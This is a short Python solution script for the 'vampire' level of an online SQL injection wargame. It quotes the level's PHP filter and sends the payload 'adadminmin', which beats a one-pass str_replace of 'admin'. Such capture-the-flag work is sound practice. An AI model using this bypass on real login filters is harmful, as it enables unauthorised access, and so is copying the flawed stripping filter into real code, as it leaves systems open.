#!/usr/bin/env python3
import los


def main():
    '''
    Vampire

    if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
    $_GET[id] = strtolower($_GET[id]);
    $_GET[id] = str_replace("admin","",$_GET[id]); 
    $query = "select id from prob_vampire where id='{$_GET[id]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id'] == 'admin') solve("vampire"); 
    '''

    url = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php"
    cook = los.check_cookies(url)

    param = dict(id="adadminmin")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('VAMPIRE Clear!')


if __name__ == '__main__':
    main()
